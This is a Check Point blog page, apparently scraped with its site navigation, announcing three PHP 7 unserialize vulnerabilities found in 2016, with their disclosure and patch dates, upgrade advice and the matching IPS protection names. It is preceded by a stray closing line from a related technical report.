From past experience, we know these primitives are more than sufficient to get to arbitrary code execution.

©2016 Check Point Software Technologies Ltd. All rights reserved   |   7



=== Content from blog.checkpoint.com_8c7eb5fb_20250125_195931.html ===


[Get a Demo](https://www.checkpoint.com/demos/)
[Contact Us](https://www.checkpoint.com/about-us/contact-us/)
[Support](https://supportcenter.checkpoint.com/)
[Log In](https://usercenter.checkpoint.com/usercenter/index.jsp)
![Search](https://www.checkpoint.com/wp-content/themes/checkpoint-theme-v2/images/search.png)

![Languages](https://www.checkpoint.com/wp-content/themes/checkpoint-theme-v2/images/intl.png)

* Choose your language...
* [English (English)](https://www.checkpoint.com/)
* [Spanish (Español)](https://www.checkpoint.com/es/)
* [French (Français)](https://www.checkpoint.com/fr/)
* [German (Deutsch)](https://www.checkpoint.com/de/)
* [Italian (Italiano)](https://www.checkpoint.com/it/)
* [Portuguese (Português)](https://www.checkpoint.com/pt/)
* [Japanese (日本語)](https://www.checkpoint.com/jp/)
* [Chinese (中文)](https://www.checkpoint.com.cn/)
* [Korean (한국어)](https://www.checkpoint.com/kr/)
* [Taiwan (繁體中文)](https://www.checkpoint.com/tw/)

* Search
* Geo Menu
  + - Choose your language...
    - [English (English)](https://www.checkpoint.com/)
    - [Spanish (Español)](https://www.checkpoint.com/es/)
    - [French (Français)](https://www.checkpoint.com/fr/)
    - [German (Deutsch)](https://www.checkpoint.com/de/)
    - [Italian (Italiano)](https://www.checkpoint.com/it/)
    - [Portuguese (Português)](https://www.checkpoint.com/pt/)
    - [Japanese (日本語)](https://www.checkpoint.com/jp/)
    - [Chinese (中文)](https://www.checkpoint.com.cn/)
    - [Korean (한국어)](https://www.checkpoint.com/kr/)
    - [Taiwan (繁體中文)](https://www.checkpoint.com/tw/)

* Products
  + Network & SASE
    - [**NETWORK**](https://www.checkpoint.com/quantum/)
    - [Next-generation Firewalls](https://www.checkpoint.com/quantum/next-generation-firewall/)
    - [Firewall Cluster](https://www.checkpoint.com/quantum/maestro-hyperscale-network-security/)
    - [Industrial Firewalls](https://www.checkpoint.com/quantum/next-generation-firewall/industrial-control-systems-appliances/)
    - [SMB Firewalls](https://www.checkpoint.com/quantum/next-generation-firewall/small-business-firewall/)
    - [DDoS Protection](https://www.checkpoint.com/quantum/ddos-protector/)
    - [Security Management](https://www.checkpoint.com/quantum/unified-management/)
    - [SD-WAN](https://www.checkpoint.com/quantum/sd-wan/)
    - [Remote Access VPN](https://www.checkpoint.com/quantum/remote-access-vpn/)
    - [**SASE**](https://www.checkpoint.com/harmony/sase/)
    - [Private Access](https://www.checkpoint.com/harmony/sase/private-access/)
    - [Internet Access](https://www.checkpoint.com/harmony/sase/internet-access/)
  + Cloud & Applications
    - [**CLOUD**](https://www.checkpoint.com/cloudguard/)
    - [Cloud Network Security](https://www.checkpoint.com/cloudguard/cloud-network-security/)
    - [Cloud Virtual WAN](https://www.checkpoint.com/cloudguard/microsoft-azure-security/wan/)
    - [Cloud Native Application Protection Platform](https://www.checkpoint.com/cloudguard/cnapp/)
    - [Cloud Security Posture Management (CSPM)](https://www.checkpoint.com/cloudguard/cloud-security-posture-management/)
    - [Workload Protection](https://www.checkpoint.com/cloudguard/workload-protection/)
    - [Cloud Infrastructure Entitlement Management (CIEM)](https://www.checkpoint.com/cloudguard/cloud-infrastructure-entitlement-management/)
    - [Code Security](https://www.checkpoint.com/cloudguard/developer-security/)
    - [Web Application and API Security](https://www.checkpoint.com/cloudguard/appsec/)
    - [**WORKSPACE**](https://www.checkpoint.com/harmony/)
    - [Email & Collaboration](https://www.checkpoint.com/harmony/email-security/email-office/)
    - [Mobile](https://www.checkpoint.com/harmony/mobile-security/mobile/)
    - [Endpoint](https://www.checkpoint.com/harmony/advanced-endpoint-protection/)
    - [Browse](https://www.checkpoint.com/harmony/browse/)
  + [Security Operations](https://www.checkpoint.com/infinity/soc/)
    - [External Risk Management](https://www.checkpoint.com/infinity/soc/external-risk-management/)
    - [Extended Detection and Response (XDR)](https://www.checkpoint.com/infinity/xdr-xpr/)
    - [Managed Detection and Response (MDR)](https://www.checkpoint.com/horizon/mdr-mpr/)
    - [Cloud Detection & Response (CDR)](https://www.checkpoint.com/cloudguard/cloud-intelligence-threat-hunting/)
    - [Unified Events](https://www.checkpoint.com/infinity/events/)
    - [Security Automation Playbooks](https://www.checkpoint.com/infinity/playblocks/)
  + [AI](https://www.checkpoint.com/infinity/ai/)
    - [Threat Prevention & Intelligence](https://www.checkpoint.com/ai/threatcloud/)
    - [AI Cloud Infrastructure](https://www.checkpoint.com/ai/cloudprotect/)
    - [AI Copilot Assistant](https://www.checkpoint.com/ai/copilot/)
    - [GenAI Security](https://www.checkpoint.com/solutions/genai-security/)
    - [View Products A-Z](https://www.checkpoint.com/products/)
* Solutions

  Use Cases
  - [Anti-Ransomware](https://www.checkpoint.com/solutions/ransomware-protection/)
  - [Collaboration Security](https://www.checkpoint.com/solutions/cloud-collaboration/)
  - [Compliance](https://www.checkpoint.com/solutions/compliance-governance/)
  - [Developer Security & Operations](https://www.checkpoint.com/cloudguard/devsecops/)
  - [Email Security](https://www.checkpoint.com/solutions/email-security-solution/)
  - [Generative AI](https://www.checkpoint.com/solutions/genai-security/)
  - [Hybrid Cloud](https://www.checkpoint.com/solutions/hybrid-data-center-security/)
  - [Hybrid Mesh Firewall](https://www.checkpoint.com/solutions/hybrid-mesh-firewall/)
  - [IoT Security Solutions](https://www.checkpoint.com/solutions/iot-security/)
  - [SD-WAN](https://www.checkpoint.com/solutions/sd-wan-security/)
  - [Threat Hunting](https://www.checkpoint.com/solutions/threat-hunting/)
  - [Zero Trust & Least Privilege](https://www.checkpoint.com/solutions/zero-trust-security/)

  Industry
  - [Education](https://www.checkpoint.com/industry/education/)
  - [Federal Government](https://www.checkpoint.com/industry/government-federal-security/)
  - [Financial Services](https://www.checkpoint.com/industry/financial-services/)
  - [Healthcare](https://www.checkpoint.com/industry/healthcare/)
  - [Retail](https://www.checkpoint.com/industry/retail/)
  - [State and Local Government](https://www.checkpoint.com/industry/government-state-local-security/)
  - [Telco / Service Provider](https://www.checkpoint.com/industry/service-provider/)
  Business Size
  - [Large Enterprise](https://www.checkpoint.com/solutions/enterprise-network-security/)
  - [Small & Medium Business](https://www.checkpoint.com/solutions/small-medium-business-security/)
* Products
  + Network
    - [**Next-generation Firewalls**](https://www.checkpoint.com/quantum/next-generation-firewall/)
    - [**Firewall Cluster**](https://www.checkpoint.com/quantum/maestro-hyperscale-network-security/)
    - [**Industrial Firewalls**](https://www.checkpoint.com/quantum/next-generation-firewall/industrial-control-systems-appliances/)
    - [**SMB Firewalls**](https://www.checkpoint.com/quantum/next-generation-firewall/small-business-firewall/)
    - [**DDoS Protection**](https://www.checkpoint.com/quantum/ddos-protector/)
    - [**Security Management**](https://www.checkpoint.com/quantum/unified-management/)
    - [**SD-WAN**](https://www.checkpoint.com/quantum/sd-wan/)
    - [**Remote Access VPN**](https://www.checkpoint.com/quantum/remote-access-vpn/)
  + SASE
    - [**Private Access**](https://www.checkpoint.com/harmony/sase/private-access/)
    - [**Internet Access**](https://www.checkpoint.com/harmony/sase/internet-access/)
  + Cloud
    - [**Cloud Network Security**](https://www.checkpoint.com/cloudguard/cloud-network-security/)
    - [**Cloud Virtual WAN**](https://www.checkpoint.com/cloudguard/microsoft-azure-security/wan/)
    - [**Cloud Native Application Protection Platform**](https://www.checkpoint.com/cloudguard/cnapp/)
    - [**Cloud Security Posture Management (CSPM)**](https://www.checkpoint.com/cloudguard/cloud-security-posture-management/)
    - [**Workload Protection**](https://www.checkpoint.com/cloudguard/workload-protection/)
    - [**Cloud Infrastructure Entitlement Management (CIEM)**](https://www.checkpoint.com/cloudguard/cloud-infrastructure-entitlement-management/)
    - [**Code Security**](https://www.checkpoint.com/cloudguard/developer-security/)
    - [**Web Application and API Security**](https://www.checkpoint.com/cloudguard/appsec/)
  + Workspace
    - [**Email & Collaboration**](https://www.checkpoint.com/harmony/email-security/email-office/)
    - [**Mobile**](https://www.checkpoint.com/harmony/mobile-security/mobile/)
    - [**Endpoint**](https://www.checkpoint.com/harmony/advanced-endpoint-protection/)
    - [**Browse**](https://www.checkpoint.com/harmony/browse/)
  + Security Operations
    - [**External Risk Management**](https://www.checkpoint.com/infinity/soc/external-risk-management/)
    - [**Extended Detection and Response (XDR)**](https://www.checkpoint.com/infinity/xdr-xpr/)
    - [**Managed Detection and Response (MDR)**](https://www.checkpoint.com/horizon/mdr-mpr/)
    - [**Cloud Detection & Response (CDR)**](https://www.checkpoint.com/cloudguard/cloud-intelligence-threat-hunting/)
    - [**Unified Events**](https://www.checkpoint.com/infinity/events/)
    - [Security Automation Playbooks](https://www.checkpoint.com/infinity/playblocks/)
  + AI
    - [**Threat Prevention & Intelligence**](https://www.checkpoint.com/ai/threatcloud/)
    - [**AI Cloud Infrastructure**](https://www.checkpoint.com/ai/cloudprotect/)
    - [**AI Copilot Assistant**](https://www.checkpoint.com/ai/copilot/)
    - [**GenAI Security**](https://www.checkpoint.com/solutions/genai-security/)

* Solutions
  + Use Cases
    - [**Anti-Ransomware**](https://www.checkpoint.com/solutions/ransomware-protection/)
    - [**Collaboration Security**](https://www.checkpoint.com/solutions/cloud-collaboration/)
    - [**Compliance**](https://www.checkpoint.com/solutions/compliance-governance/)
    - [**Developer Security & Operations**](https://www.checkpoint.com/cloudguard/devsecops/)
    - [**Email Security**](https://www.checkpoint.com/solutions/email-security-solution/)
    - [**Generative AI**](https://www.checkpoint.com/solutions/genai-security/)
    - [**Hybrid Cloud**](https://www.checkpoint.com/solutions/hybrid-data-center-security/)
    - [**Hybrid Mesh Firewall**](https://www.checkpoint.com/solutions/hybrid-mesh-firewall/)
    - [**IoT Security Solutions**](https://www.checkpoint.com/solutions/iot-security/)
    - [**SD-WAN**](https://www.checkpoint.com/solutions/sd-wan-security/)
    - [**Threat Hunting**](https://www.checkpoint.com/solutions/threat-hunting/)
    - [**Zero Trust & Least Privilege**](https://www.checkpoint.com/solutions/zero-trust-security/)
  + Industry
    - [**Education**](https://www.checkpoint.com/industry/education/)
    - [**Federal Government**](https://www.checkpoint.com/industry/government-federal-security/)
    - [**Financial Services**](https://www.checkpoint.com/industry/financial-services/)
    - [**Healthcare**](https://www.checkpoint.com/industry/healthcare/)
    - [**Retail**](https://www.checkpoint.com/industry/retail/)
    - [**State and Local Government**](https://www.checkpoint.com/industry/government-state-local-security/)
    - [**Telco / Service Provider**](https://www.checkpoint.com/industry/service-provider/)
  + Organization Size
    - [**Large Enterprise**](https://www.checkpoint.com/solutions/enterprise-network-security/)
    - [**Small & Medium Business**](https://www.checkpoint.com/solutions/small-medium-business-security/)
* Platform
  + - [**Unified Platform Overview**](https://www.checkpoint.com/infinity/)
    - [**Infinity Platform Services**](https://www.checkpoint.com/infinity/core-services/)
    - [**Platform License Agreement**](https://www.checkpoint.com/infinity/platform-agreement/)
    - [**Single Management Portal**](https://www.checkpoint.com/infinity/portal/)
  + ![2025 Cyber Security Report](https://www.checkpoint.com/wp-content/uploads/navigation-500x250-1.jpg)
    ##### 2025 Cyber Security Report

    [DOWNLOAD REPORT](https://www.checkpoint.com/security-report/)
* Services
  + [Strategy and Risk](https://www.checkpoint.com/services/strategy-and-risk/)
    - [**Cyber Risk Assessment**](https://www.checkpoint.com/services/infinity-global/cyber-risk-assessment/)
    - [**vCISO Risk & Compliance Services**](https://www.checkpoint.com/services/infinity-global/ciso-advisory-service/)
    - [**Attack Surface Assessment**](https://www.checkpoint.com/services/infinity-global/external-attack-surface-assessment/)
    - [**Penetration Testing**](https://www.checkpoint.com/services/infinity-global/penetration-testing/)
    - [**Ransomware Readiness Assessment**](https://www.checkpoint.com/services/infinity-global/ransomware-readiness-assessment/)
  + [Professional Services](https://www.checkpoint.com/services/professional-services/)
    - [**Security Deployment and Optimization**](https://www.checkpoint.com/professional-services/)
    - [**Lifecycle Management Services**](https://www.checkpoint.com/support-services/lifecycle-management/)
    - [**Advanced Technical Account Management**](https://www.checkpoint.com/professional-services/account-management/)
  + [Training Programs](https://www.checkpoint.com/services/training/)
    - [**Training & Certification**](https://training-certifications.checkpoint.com/#/)
    - [**Security Awareness**](https://www.checkpoint.com/mind/smartawareness/)
    - [**CISO Training**](https://www.checkpoint.com/mind/ciso-academy/)
    - [**Hacking Point**](https://www.checkpoint.com/mind/hackingpoint/)
    - [**Secure Academy**](https://www.checkpoint.com/mind/secureacademy/)
  + [Incident Response](https://www.checkpoint.com/services/incident-response/)
    - [**Incident Response**](https://www.checkpoint.com/support-services/threatcloud-incident-response/)
    - [**Digital Forensics**](https://www.checkpoint.com/services/infinity-global/digital-forensics/)
    - [**Managed Detection and Response**](https://www.checkpoint.com/infinity/mdr-mpr/)
  + [Managed Security](https://www.checkpoint.com/services/managed-security/)
    - [**SOC-as-a-Service**](https://www.checkpoint.com/services/infinity-global/managed-xdr-with-siemsoar/)
    - [**Network Security and NOC-as-a-Service**](https://www.checkpoint.com/services/infinity-global/managed-firewall/)
    - [**Cloud & IT**](https://www.checkpoint.com/services/infinity-global/managed-cspm/)
    - [**Managed Firewall as a Service**](https://www.checkpoint.com/services/infinity-global/managed-firewall-as-a-service/)
    - [View All Services](https://www.checkpoint.com/services/)
* Resources
  + - [**Resource Center**](https://www.checkpoint.com/resources)
    - [**Blog**](https://blog.checkpoint.com/)
    - [**CheckMates Community**](https://community.checkpoint.com/)
    - [**Check Point Research**](https://research.checkpoint.com/)
    - [**Customer Stories**](https://www.checkpoint.com/customer-stories/)
    - [**Cyber Hub**](https://www.checkpoint.com/cyber-hub/)
    - [**Events & Webinars**](https://www.checkpoint.com/events/)
  + ![2025 Cyber Security Report](https://www.checkpoint.com/wp-content/uploads/navigation-500x250-1.jpg)
    ##### 2025 Cyber Security Report

    [DOWNLOAD REPORT](https://www.checkpoint.com/security-report/)
* Partners
  + - [**Become a Partner**](https://www.checkpoint.com/partners/channel/)
    - [**Find a Partner**](https://partnerlocator.checkpoint.com/#/)
    - [**Channel Partners**](https://www.checkpoint.com/partners/channel/)
    - [**Technology Partners**](https://www.checkpoint.com/technology-partners/)
    - [**MSSP Partners**](https://www.checkpoint.com/partners/mssp-program/)
    - [**AWS Cloud**](https://www.checkpoint.com/cloudguard/amazon-aws-security/)
    - [**Azure Cloud**](https://www.checkpoint.com/cloudguard/microsoft-azure-security/)
    - [**Partner Portal**](https://usercenter.checkpoint.com/usercenter/index.jsp)
  + ![...](https://www.checkpoint.com/wp-content/uploads/partners-cta-2.jpg)
    ##### Check Point is 100% Channel. Grow Your Business with Us!

    [Sign Up Now](https://www.checkpoint.com/partners/channel/)
* About Us
  + - [**Company**](https://www.checkpoint.com/about-us/)
    - [**Leadership**](https://www.checkpoint.com/about-us/leadership/)
    - [**Careers**](https://www.checkpoint.com/careers/)
    - [**Investor Relations**](https://www.checkpoint.com/about-us/investor-relations/)
    - [**Newsroom**](https://www.checkpoint.com/about-us/newsroom/)
  + ![...](https://www.checkpoint.com/wp-content/uploads/nadav-announcement-nav-500x250-1.jpg)
    ##### Nadav Zafrir Named New Check Point CEO

    [Learn More](https://www.checkpoint.com/press-releases/gil-shwed-takes-on-the-role-of-executive-chairman-of-the-board-of-directors-nadav-zafrir-becomes-ceo-at-check-point-software-technologies/)

* Search
  + Search
* Geo Menu
  + Choose your language...
  + [English (English)](https://www.checkpoint.com/)
  + [Spanish (Español)](https://www.checkpoint.com/es/)
  + [French (Français)](https://www.checkpoint.com/fr/)
  + [German (Deutsch)](https://www.checkpoint.com/de/)
  + [Italian (Italiano)](https://www.checkpoint.com/it/)
  + [Portuguese (Português)](https://www.checkpoint.com/pt/)
  + [Japanese (日本語)](https://www.checkpoint.com/jp/)
  + [Chinese (中文)](https://www.checkpoint.com.cn/)
  + [Korean (한국어)](https://www.checkpoint.com/kr/)
  + [Taiwan (繁體中文)](https://www.checkpoint.com/tw/)

[![Check Point Software Technologies Ltd.](https://www.checkpoint.com/wp-content/themes/checkpoint-theme-v2/images/checkpoint-logo.png?v=1.0)](https://www.checkpoint.com/ "Check Point Software Technologies Ltd.")
Toggle Navigation

[Blog Home](https://blog.checkpoint.com/) > [Research](https://blog.checkpoint.com/research/) > Check Point discovers three Zero-Day Vulnerabilities in web programming language PHP 7 Filter by:
Select category
Research  (603)
Security  (986)
Securing the Cloud  (318)
Harmony  (210)
Company and Culture  (43)
Innovation  (6)
Customer Stories  (21)
Infinity Security Operations  (5)
Securing the Network  (14)
Partners  (10)
Connect SASE  (10)
Email Security  (114)
Artificial Intelligence  (27)
Infinity Global Services  (21)
Crypto  (13)
Healthcare  (15)
Harmony SASE  (18)
MSSP  (5)
Executive Insights  (231)

![](https://blog.checkpoint.com/wp-content/uploads/2016/04/BLOG_ThreatPrevent3.jpg)
[Research](https://blog.checkpoint.com/research/)December 27, 2016
# Check Point discovers three Zero-Day Vulnerabilities in web programming language PHP 7

![author image](/wp-content/uploads/2023/02/author-image.png)
By**Yannay Livneh, Exploit Research Team**

Share

PHP 7, the latest release of the popular web programming language that powers more than 80% of websites, offers great advantages for website owners and developers. Some of them include doubling the performance and adding numerous functionalities. Yet for hackers, it represents a completely fresh attack vector, where they can find previously undisclosed vulnerabilities.

During the past few months, we have analyzed PHP 7 and made it a priority to look into one of the most notoriously vulnerable areas of PHP: *The unserialize mechanism*. This is the same mechanism that was heavily exploited in PHP 5 and allowed hackers to compromise popular platforms as [Magento](http://netanelrub.in/2016/05/17/magento-unauthenticated-remote-code-execution/), [vBulletin](http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/), [Drupal](https://websec.wordpress.com/2015/01/09/drupal-7-34-admin-php-object-injection/), [Joomla!](https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html), [Pornhub](https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/)’s website, and other web servers, by sending maliciously crafted data in client cookies or to expose API calls.

[To download the Technical Report, click here](http://blog.checkpoint.com/wp-content/uploads/2016/12/PHP_Technical_Report.pdf)

Throughout our investigation we discovered 3 fresh and previously unknown vulnerabilities (CVE-2016-7479, CVE-2016-7480,  CVE-2016-7478) in the PHP 7 *unserialize mechanism.* These vulnerabilities can be exploited using a [technique we’ve discussed back in August](http://blog.checkpoint.com/2016/08/26/web-scripting-language-php-7-vulnerable-to-remote-exploits/).

The first two vulnerabilities allow attackers to take full control over servers, allowing them to do anything they want with the website, from spreading malware to defacing it or stealing customer data.

The last vulnerability generates a Denial of Service attack which basically hangs the website, exhausts its memory consumption, and shuts it down.

We have reported the three vulnerabilities to the PHP security team on the 15th of September and 6th of August.

**How can I protect myself from this vulnerability?**

The PHP security team issued fixes for two of the vulnerabilities on the 13th of October and 1st of December. To ensure your webserver’s security you should make sure you are installing or have upgraded to latest version of PHP.

In addition, Check Point issued IPS signatures for these vulnerabilities on the 18th and 31st of October, protecting all clients against any attempt to exploit these vulnerabilities.

**The IPS protections are:**

* PHP 7 Unserialization Exception Infinite Loop Denial of Service
* PHP 7 Unserialization Malicious toString Remote Code Execution
* PHP 7 Unserialization Hash Table Resize Use After Free
* PHP 7 Uninitialized Value Remote Code Execution

* Tagged with
* [Check Point Research](https://blog.checkpoint.com/tag/check-point-research/)
* [cybercrime](https://blog.checkpoint.com/tag/cybercrime/)
* [php](https://blog.checkpoint.com/tag/php/)
* [vulnerability](https://blog.checkpoint.com/tag/vulnerability/)

[0](#comments "0 Comments") [5351](#views "5351 Views")

#### You may also like

[![](https://blog.checkpoint.com/wp-content/uploads/2021/08/CPR_blog_article_Ebook_blog_300x200.jpg)](https://blog.checkpoint.com/research/exploring-q4-2024-brand-phishing-trends-microsoft-remains-the-top-target-as-linkedin-makes-a-comeback/)
[Research](https://blog.checkpoint.com/research/) January 22, 2025
### [Exploring Q4 2024 Brand Phishing Trends: Microsoft Remains the Top Target as LinkedIn Makes a Comeback](https://blog.checkpoint.com/research/exploring-q4-2024-brand-phishing-trends-microsoft-remains-the-top-target-as-linkedin-makes-a-comeback/)

Cyber criminals continue to refine their phishing tactics, targeting trusted ...

[![](https://blog.checkpoint.com/wp-content/uploads/2025/01/WEF-2-e1737134976221-400x300.jpg)](https://blog.checkpoint.com/security/6-cyber-security-challenges-emerge-from-world-economic-forum-check-point-research-on-2025-threats/)
[Research](https://blog.checkpoint.com/research/) January 20, 2025
### [6 Cyber Security Challenges Emerge from World Economic Forum, Check Point Research on 2025 Threats](https://blog.checkpoint.com/security/6-cyber-security-challenges-emerge-from-world-economic-forum-check-point-research-on-2025-threats/)

As we step into 2025, the cyber security landscape continues ...

[![Check Point Research](https://blog.checkpoint.com/wp-content/uploads/2024/01/blog-CPR-400x300.jpg)](https://blog.checkpoint.com/research/funksec-the-rising-yet-controversial-ransomware-threat-actor-dominating-december-2024/)
[Research](https://blog.checkpoint.com/research/) January 16, 2025
### [FunkSec: The Rising Yet Controversial Ransomware Threat Actor Dominating December 2024](https://blog.checkpoint.com/research/funksec-the-rising-yet-controversial-ransomware-threat-actor-dominating-december-2024/)

As 2024 ended, a new name surged to the top ...

[![](https://blog.checkpoint.com/wp-content/uploads/2025/01/Cyber-Security-Report-2025-Blog-banner-400X800-400x300.png)](https://blog.checkpoint.com/research/5-key-cyber-security-trends-for-2025/)
[Research](https://blog.checkpoint.com/research/) January 14, 2025
### [5 Key Cyber Security Trends for 2025](https://blog.checkpoint.com/research/5-key-cyber-security-trends-for-2025/)

As the digital world continues to evolve, threats to organizations ...

* COMPANY
  + [About Us](https://www.checkpoint.com/about-us/)
  + [Careers](https://careers.checkpoint.com/)
  + [Leadership](https://www.checkpoint.com/about-us/leadership/)
  + [Newsroom](https://www.checkpoint.com/press-releases/)
  + [Legal](https://www.checkpoint.com/legal/)
  + [Trust Center](https://www.checkpoint.com/trust-point/)
  + [Investor Relations](https://www.checkpoint.com/about-us/investor-relations/)
  + [Merchandise Store](https://checkpointcompanystore.com/)
  + [Contact Us](https://www.checkpoint.com/about-us/contact-us/)
* TECHNICAL RESOURCES
  + [User Center Sign In](https://usercenter.checkpoint.com/usercenter/index.jsp)
  + [Advisories](https://advisories.checkpoint.com/)
  + [Threat Map](https://threatmap.checkpoint.com/)
  + [Threat Wiki](https://threatwiki.checkpoint.com/threatwiki/public.htm)
  + [URL Categorization](https://www.checkpoint.com/urlcat/)
  + [App Wiki](https://appwiki.checkpoint.com/appwikisdb/public.htm)
* EXPAND & LEARN
  + [Resource Center](https://resources.checkpoint.com/)
  + [Cyber Hub](https://www.checkpoint.com/cyber-hub/)
  + [Check Point Research](https://research.checkpoint.com/)
  + [Check Point Blog](https://blog.checkpoint.com/)
  + [CheckMates Community](https://community.checkpoint.com/)
  + [Customer Stories](https://www.checkpoint.com/customer-stories/)
* SUPPORT & SERVICES
  + [Support Center](https://supportcenter.checkpoint.com/)
  + [Infinity Global Services](https://www.checkpoint.com/services/infinity-global/)
  + [IGS Portal](https://igs.checkpoint.com/)
* + ![Black phone icon](/wp-content/themes/atoms/images/icon-phone.png) Contact Sales
    - **North America:**
    - +1-866-488-6691
    - **International:**
    - +44-125-333-5558
  + ![Black phone icon](/wp-content/themes/atoms/images/icon-phone.png) Contact Support
    - **North America:**
    - +1-888-361-5030
    - **International:**
    - +44-114-478-2845

---

Follow Us

YOU DESERVE THE BEST SECURITY™
©1994-
2025 Check Point Software Technologies Ltd. All rights reserved.


